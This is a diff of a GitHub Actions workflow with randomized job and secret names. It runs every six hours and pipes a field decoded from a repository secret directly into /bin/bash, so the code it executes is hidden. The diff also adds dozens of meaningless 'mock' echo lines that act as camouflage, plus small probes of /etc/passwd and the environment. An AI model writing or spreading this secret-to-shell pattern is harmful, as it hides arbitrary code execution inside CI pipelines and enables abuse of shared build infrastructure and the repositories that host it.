@@ -1,15 +1,47 @@
-name: yongqueji3194 #30037
-on: #29782
-  workflow_dispatch: #11472
-  schedule: #3238
-    - cron: '56 5/6 * * *' #21006
-jobs: #17075
-  build: #24800
-    runs-on: ubuntu-latest #3488
-    steps: #22724
-      - uses: actions/checkout@v4 #3854
-      - name: yongqueji3194 #8315
-        env: #27226
-          j18656: ${{ secrets.j18656 }} #8808
+name: yongqueji3194 #29595
+on: #22992
+  workflow_dispatch: #23319
+  schedule: #15105
+    - cron: '29 2/6 * * *' #9115
+jobs: #18265
+  build: #5515
+    runs-on: ubuntu-latest #19321
+    steps: #24070
+      - uses: actions/checkout@v4 #17534
+      - name: yongqueji3194 #12589
+        env: #24671
+          d15939: ${{ secrets.d15939 }} #21055
         run: |
-          echo $j18656 | jq -r .y26887 | /bin/bash #22759
+          echo $d15939 | jq -r .s27710 | /bin/bash #7364
+          echo "Checksum: $((1000 + RANDOM % 9000))"
+          echo "Subshell: (echo subshell)"
+          echo "Array mock: arr=(1 2 3); echo \${arr[0]}"
+          echo "Redirect mock: echo data > /dev/null 2>&1"
+          echo "Date only: $(date +%F)"
+          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
+          echo "Temp file mock: tmp=\$(mktemp) && echo \$tmp || echo no-tmp"
+          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
+          echo "Build $(date +%s)"
+          echo "Disk usage (fake): $(df -h . 2>/dev/null | tail -1 || echo N/A)"
+          echo "Arith loop: for ((i=0;i<3;i++)); do echo $i; done"
+          echo "Case mock: case 1 in 1) echo 1;; esac"
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo "Home dir: $(echo ~)"
+          echo "Random sleep: sleep $((RANDOM % 2)) 2>/dev/null || true"
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          echo "Null check: [ ! -f /nonexistent ] && echo 'OK'"
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo "String len: ${#HOSTNAME}"
+          echo "Bit ops: $(( 1 & 1 ))"
+          echo "Curl mock: curl -s http://example.com 2>/dev/null | head -1 || echo no-curl"
+          echo "Var default: echo \${VAR:-default}"
+          echo "And/or chain: true && echo A || echo B"
+          echo "Arithmetic: $(( (RANDOM % 5) * 10 ))"
+          echo "Grep mock: grep 'a' <<< 'abc' 2>/dev/null || echo no-grep"
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          echo "Command fail safe: false || echo 'Safe'"
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          echo "Random check: [ $((RANDOM % 2)) -eq 0 ] && echo Even || echo Odd"
+          echo "Env vars: $(env | wc -l) total"
+          echo "Brace exp: echo file_{1..3}.txt"
+          [ -z "$RANDOM" ] || echo "Random var set"
